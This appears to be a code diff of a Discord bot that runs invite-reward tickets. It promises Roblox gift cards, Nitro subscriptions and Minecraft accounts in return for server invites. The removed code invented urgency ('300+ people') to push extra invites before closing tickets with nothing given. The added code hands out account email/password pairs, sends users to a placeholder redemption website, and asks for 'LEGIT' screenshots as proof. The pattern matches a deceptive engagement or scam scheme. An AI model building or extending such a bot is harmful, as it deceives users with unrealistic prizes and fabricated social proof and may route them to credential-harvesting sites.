@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, Events, EmbedBuilder } = require('discord.js');
 
 const client = new Client({
     intents: [
@@ -11,9 +11,24 @@ const client = new Client({
 });
 
 const TOKEN = process.env.TOKEN;
-const waitingForRmi = new Set();
-const waitingForOption = new Set();
 const inviteCache = new Map();
+const waitingForOption = new Map();
+const waitingForRmi = new Map();
+const INVITE_REWARDS_CHANNEL = '1474732359889850411';
+
+const rewards = {
+    '1': { name: 'Mcfa Permanent', type: 'minecraft' },
+    '2': { name: 'Minecraft Redeem Code', type: 'minecraft' },
+    '3': { name: 'Roblox 50$ Giftcard', type: 'website' },
+    '4': { name: 'Roblox 100$ Giftcard', type: 'website' },
+    '5': { name: 'Nitro Basic Yearly', type: 'website' },
+    '6': { name: 'Nitro Boost Yearly', type: 'website' },
+};
+
+const minecraftAccounts = [
+    { email: 'account1@gmail.com', pass: 'password1' },
+    { email: 'account2@gmail.com', pass: 'password2' },
+];
 
 process.on('unhandledRejection', (error) => {
     console.error('Unhandled rejection:', error);
@@ -123,63 +138,43 @@ client.on(Events.ChannelCreate, async (channel) => {
                 { name: 'Joins', value: `${stats.joins}`, inline: true },
                 { name: 'Left', value: `${stats.left}`, inline: true },
                 { name: 'Fake', value: `${stats.fake}`, inline: true },
-                { name: 'Rejoins', value: `0`, inline: true },
+                { name: 'Rejoins', value: `0 (7d)`, inline: true },
             )
             .setThumbnail(member.user.displayAvatarURL())
             .setColor(0x2b2d31);
 
         await channel.send({ embeds: [embed] });
-        await new Promise(r => setTimeout(r, 3000));
+        await new Promise(r => setTimeout(r, 2000));
 
         if (total < 1) {
-            await channel.send(`❌ ${member} you do not meet the invite requirement. This ticket will be closed.`);
-            await new Promise(r => setTimeout(r, 5000));
+            await channel.send(
+                `${member} You have **0 invite(s)** right now. Check <#${INVITE_REWARDS_CHANNEL}> for the rewards.\n\n` +
+                `Left: People who joined from your invite but left the server\n` +
+                `Fake: Any account considered an ALT or new account\n` +
+                `Rejoin: Members who left and rejoined with your link`
+            );
+            await new Promise(r => setTimeout(r, 10000));
             await channel.delete().catch(() => {});
             return;
         }
 
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('option1').setLabel('Option 1 - 14 Days').setStyle(ButtonStyle.Secondary),
-            new ButtonBuilder().setCustomId('option2').setLabel('Option 2 - 7 Days').setStyle(ButtonStyle.Primary),
-            new ButtonBuilder().setCustomId('option3').setLabel('Option 3 - Instant').setStyle(ButtonStyle.Success),
+        await channel.send(
+            `${member} You have **${total} invite(s)** right now. Here are your options:\n\n` +
+            `1) Mcfa Permanent *(1 invite)*\n` +
+            `2) Minecraft Redeem Code *(1 invite)*\n` +
+            `3) Roblox 50$ Giftcard *(1 invite)*\n` +
+            `4) Roblox 100$ Giftcard *(1 invite)*\n` +
+            `5) Nitro Basic Yearly *(1 invite)*\n` +
+            `6) Nitro Boost Yearly *(1 invite)*\n\n` +
+            `Left: People who joined from your invite but left the server\n` +
+            `Fake: Any account considered an ALT or new account\n` +
+            `Rejoin: Members who left and rejoined with your link\n\n` +
+            `**Reply with the number (1-6) or just type the reward name.**`
         );
 
-        await channel.send({
-            content: `✅ Since we currently have over **300+ people** trying to claim, we added a few options to help everyone get their rewards faster:\n\n▶️ \`Option 1\` : You wouldn't have to invite anyone, **BUT** it'll take __14 days__ for your reward\n▶️ \`Option 2\` : You can invite **3 extra people** on top of your reward and you can wait __7 days__\n▶️ \`Option 3\` : You can invite **6 extra people** on top of your rewards and you can get it **INSTANTLY**\n\n👉 Please choose an option:`,
-            components: [row]
-        });
-
-        waitingForOption.add(channel.id);
+        waitingForOption.set(channel.id, member.id);
     } catch (e) {
         console.log('Error in ChannelCreate:', e.message);
-    }
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    try {
-        if (!interaction.isButton()) return;
-        const channel = interaction.channel;
-
-        waitingForOption.delete(channel.id);
-
-        if (interaction.customId === 'option1') {
-            await interaction.reply({ content: '📸 Please take a screenshot as proof! This ticket will close in **10 seconds**.' });
-            await new Promise(r => setTimeout(r, 10000));
-            await channel.delete().catch(() => {});
-        }
-
-        if (interaction.customId === 'option2') {
-            await interaction.reply({ content: '👥 Please invite **3 people** and then create a new ticket to claim your reward! This ticket will close in **10 seconds**.' });
-            await new Promise(r => setTimeout(r, 10000));
-            await channel.delete().catch(() => {});
-        }
-
-        if (interaction.customId === 'option3') {
-            await interaction.reply({ content: '👉 Please type `-rmi` to claim your reward!' });
-            waitingForRmi.add(channel.id);
-        }
-    } catch (e) {
-        console.log('Error in InteractionCreate:', e.message);
     }
 });
 
@@ -188,21 +183,56 @@ client.on(Events.MessageCreate, async (message) => {
         if (message.author.bot) return;
 
         if (waitingForOption.has(message.channel.id)) {
-            await message.channel.send('⚠️ Please choose one of the options below or this ticket will close in **15 seconds**!');
-            await new Promise(r => setTimeout(r, 15000));
-            if (waitingForOption.has(message.channel.id)) {
-                waitingForOption.delete(message.channel.id);
-                await message.channel.delete().catch(() => {});
+            const choice = message.content.trim();
+            const reward = rewards[choice];
+
+            if (!reward) {
+                await message.channel.send(`⚠️ Please reply with a number between **1-6** or this ticket will close in **15 seconds**!`);
+                await new Promise(r => setTimeout(r, 15000));
+                if (waitingForOption.has(message.channel.id)) {
+                    waitingForOption.delete(message.channel.id);
+                    await message.channel.delete().catch(() => {});
+                }
+                return;
             }
+
+            waitingForOption.delete(message.channel.id);
+            waitingForRmi.set(message.channel.id, reward);
+            await message.channel.send(`${message.author} Please type \`-rmi\` to receive your **${reward.name}**!`);
             return;
         }
 
         if (waitingForRmi.has(message.channel.id)) {
             if (message.content.trim().toLowerCase() === '-rmi') {
+                const reward = waitingForRmi.get(message.channel.id);
                 waitingForRmi.delete(message.channel.id);
-                await message.channel.send('✅ Done! Please wait for a staff member to arrive and give you your reward!');
+
+                if (reward.type === 'minecraft') {
+                    if (minecraftAccounts.length === 0) {
+                        await message.channel.send('❌ No accounts available right now. Please contact staff!');
+                        return;
+                    }
+                    const account = minecraftAccounts.shift();
+                    await message.channel.send(
+                        `**${reward.name}**\n` +
+                        `Email = ${account.email}\n` +
+                        `Pass = ${account.pass}\n\n` +
+                        `${message.author} Are we **LEGIT?**\n` +
+                        `@Staff Please screenshot and post in proofs. Thanks!`
+                    );
+                } else {
+                    await message.channel.send(
+                        `**${reward.name}**\n\n` +
+                        `Redeem here: https://yourwebsite.vercel.app\n\n` +
+                        `${message.author} Are we **LEGIT?**\n` +
+                        `@Staff Please screenshot and post in proofs. Thanks!`
+                    );
+                }
+
+                await new Promise(r => setTimeout(r, 30000));
+                await message.channel.delete().catch(() => {});
             } else {
-                await message.channel.send('⚠️ Please type `-rmi` or this ticket will close in **15 seconds**!');
+                await message.channel.send(`⚠️ Please type \`-rmi\` or this ticket will close in **15 seconds**!`);
                 await new Promise(r => setTimeout(r, 15000));
                 if (waitingForRmi.has(message.channel.id)) {
                     waitingForRmi.delete(message.channel.id);
